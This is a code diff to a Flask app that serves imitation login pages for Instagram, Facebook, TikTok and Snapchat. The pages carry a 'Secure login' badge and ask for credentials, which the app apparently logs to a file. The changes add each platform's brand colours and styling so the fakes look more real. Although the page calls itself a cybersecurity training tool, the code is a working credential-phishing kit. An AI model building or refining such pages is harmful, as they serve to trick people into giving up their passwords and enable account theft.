@@ -11,12 +11,36 @@ if not os.path.exists(LOG_FILE):
     with open(LOG_FILE, "w") as f:
         json.dump([], f)
 
-# Platform data
+# Platform data with colors
 PLATFORMS = {
-    'instagram': {'icon': '📸', 'name': 'Instagram'},
-    'facebook': {'icon': '👍', 'name': 'Facebook'},
-    'tiktok': {'icon': '🎵', 'name': 'TikTok'},
-    'snapchat': {'icon': '👻', 'name': 'Snapchat'}
+    'instagram': {
+        'icon': '📸',
+        'name': 'Instagram',
+        'color': '#E4405F',
+        'gradient': 'linear-gradient(135deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%)',
+        'bg': '#fafafa'
+    },
+    'facebook': {
+        'icon': '👍',
+        'name': 'Facebook',
+        'color': '#1877F2',
+        'gradient': 'linear-gradient(135deg, #1877F2 0%, #0d65d9 100%)',
+        'bg': '#f0f2f5'
+    },
+    'tiktok': {
+        'icon': '🎵',
+        'name': 'TikTok',
+        'color': '#000000',
+        'gradient': 'linear-gradient(135deg, #000000 0%, #25f4ee 50%, #fe2c55 100%)',
+        'bg': '#ffffff'
+    },
+    'snapchat': {
+        'icon': '👻',
+        'name': 'Snapchat',
+        'color': '#FFFC00',
+        'gradient': 'linear-gradient(135deg, #FFFC00 0%, #f5e800 100%)',
+        'bg': '#f5f5f5'
+    }
 }
 
 # Home page - platform grid
@@ -49,7 +73,6 @@ HTML_HOME = """
             margin: 20px 0;
         }
         .platform {
-            background: #f5f5f5;
             padding: 20px 10px;
             border-radius: 16px;
             border: 1px solid #eee;
@@ -57,10 +80,15 @@ HTML_HOME = """
             text-decoration: none;
             color: #111;
             display: block;
+            background: #f5f5f5;
         }
         .platform:active { transform: scale(0.95); }
         .platform .emoji-icon { font-size: 48px; display: block; margin-bottom: 8px; }
         .platform span { display: block; font-weight: 500; font-size: 14px; color: #333; }
+        .platform.instagram { background: #fafafa; border-color: #E4405F; }
+        .platform.facebook { background: #f0f2f5; border-color: #1877F2; }
+        .platform.tiktok { background: #ffffff; border-color: #000000; }
+        .platform.snapchat { background: #f5f5f5; border-color: #FFFC00; }
         .footer { margin-top: 30px; font-size: 14px; color: #999; }
         .footer span { color: #111; font-weight: 500; }
         .warning {
@@ -82,19 +110,19 @@ HTML_HOME = """
         <p class="sub">Learn cybersecurity by doing</p>
         <div class="warning">⚠️ Training mode — use fake data</div>
         <div class="grid">
-            <a href="/login/instagram" class="platform">
+            <a href="/login/instagram" class="platform instagram">
                 <span class="emoji-icon">📸</span>
                 <span>Instagram</span>
             </a>
-            <a href="/login/facebook" class="platform">
+            <a href="/login/facebook" class="platform facebook">
                 <span class="emoji-icon">👍</span>
                 <span>Facebook</span>
             </a>
-            <a href="/login/tiktok" class="platform">
+            <a href="/login/tiktok" class="platform tiktok">
                 <span class="emoji-icon">🎵</span>
                 <span>TikTok</span>
             </a>
-            <a href="/login/snapchat" class="platform">
+            <a href="/login/snapchat" class="platform snapchat">
                 <span class="emoji-icon">👻</span>
                 <span>Snapchat</span>
             </a>
@@ -105,7 +133,7 @@ HTML_HOME = """
 </html>
 """
 
-# Login page template with password toggle
+# Login page template with platform color
 LOGIN_TEMPLATE = """
 <!DOCTYPE html>
 <html>
@@ -118,35 +146,60 @@ LOGIN_TEMPLATE = """
         html, body {
             height: 100%;
             width: 100%;
-            background: #ffffff;
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 20px;
+            background: {{ bg }};
         }
-        .container { max-width: 400px; width: 100%; text-align: center; }
+        .container {
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+            background: #ffffff;
+            border-radius: 20px;
+            padding: 40px 30px;
+            box-shadow: 0 2px 20px rgba(0,0,0,0.08);
+        }
         .platform-icon { font-size: 60px; margin-bottom: 10px; }
-        h1 { font-size: 34px; font-weight: 700; color: #111; margin-bottom: 4px; }
-        .sub { font-size: 16px; color: #666; margin-bottom: 30px; }
+        .platform-header {
+            font-size: 24px;
+            font-weight: 700;
+            color: {{ color }};
+            margin-bottom: 4px;
+        }
+        .platform-badge {
+            display: inline-block;
+            background: {{ color }}10;
+            color: {{ color }};
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 500;
+            margin-bottom: 20px;
+        }
+        .sub { font-size: 15px; color: #666; margin-bottom: 25px; }
         .input-group {
             position: relative;
-            margin: 8px 0;
+            margin: 10px 0;
         }
         .input-group input {
             width: 100%;
-            padding: 16px 14px;
+            padding: 14px 16px;
+            padding-right: 48px;
             background: #f5f5f5;
             border: 1px solid #ddd;
             border-radius: 12px;
-            font-size: 18px;
+            font-size: 16px;
             color: #111;
-            padding-right: 50px;
+            transition: 0.2s;
         }
         .input-group input:focus {
             outline: none;
-            border-color: #007aff;
+            border-color: {{ color }};
             background: #fff;
+            box-shadow: 0 0 0 3px {{ color }}20;
         }
         .toggle-password {
             position: absolute;
@@ -155,50 +208,50 @@ LOGIN_TEMPLATE = """
             transform: translateY(-50%);
             background: none;
             border: none;
-            font-size: 24px;
+            font-size: 20px;
             cursor: pointer;
             padding: 0;
             color: #888;
             line-height: 1;
+            opacity: 0.6;
+            transition: 0.2s;
         }
+        .toggle-password:hover { opacity: 1; }
         .toggle-password:active { transform: translateY(-50%) scale(0.9); }
-        button {
+        button[type="submit"] {
             width: 100%;
-            padding: 16px;
-            background: #007aff;
+            padding: 14px;
+            background: {{ color }};
             color: white;
             border: none;
             border-radius: 12px;
-            font-size: 20px;
+            font-size: 18px;
             font-weight: 600;
             cursor: pointer;
-            margin-top: 12px;
+            margin-top: 15px;
+            transition: 0.2s;
         }
-        button:hover { background: #0066d9; }
-        .footer { margin-top: 25px; font-size: 14px; color: #999; }
+        button[type="submit"]:hover {
+            opacity: 0.9;
+            transform: scale(0.98);
+        }
+        .footer { margin-top: 25px; font-size: 13px; color: #999; }
         .footer span { color: #111; font-weight: 500; }
         .back {
             display: inline-block;
             margin-top: 15px;
-            color: #007aff;
+            color: {{ color }};
             text-decoration: none;
-            font-size: 16px;
+            font-size: 15px;
+            font-weight: 500;
         }
-        .platform-badge {
-            display: inline-block;
-            background: #f0f0f0;
-            padding: 8px 16px;
-            border-radius: 20px;
-            font-size: 14px;
-            color: #333;
-            margin-bottom: 20px;
-        }
+        .back:hover { text-decoration: underline; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="platform-icon">{{ icon }}</div>
-        <h1>{{ platform }}</h1>
+        <div class="platform-header">{{ platform }}</div>
         <div class="platform-badge">🔒 Secure login</div>
         <p class="sub">Enter your {{ platform }} credentials</p>
         <form action="/login/{{ platform.lower() }}" method="POST">
@@ -209,7 +262,7 @@ LOGIN_TEMPLATE = """
                 <input type="password" name="password" id="password" placeholder="Password" required>
                 <button type="button" class="toggle-password" onclick="togglePassword()">👁️</button>
             </div>
-            <button type="submit">Login</button>
+            <button type="submit">Log In</button>
         </form>
         <a href="/" class="back">← Go back</a>
         <p class="footer">Built by <span>Luiz Vad</span> 🧸</p>
@@ -245,6 +298,8 @@ def login_page(platform):
     html = LOGIN_TEMPLATE.replace('{{ platform }}', data['name'])
     html = html.replace('{{ icon }}', data['icon'])
     html = html.replace('{{ platform.lower() }}', platform)
+    html = html.replace('{{ color }}', data['color'])
+    html = html.replace('{{ bg }}', data['bg'])
     return html
 
 @app.route('/login/<platform>', methods=['POST'])
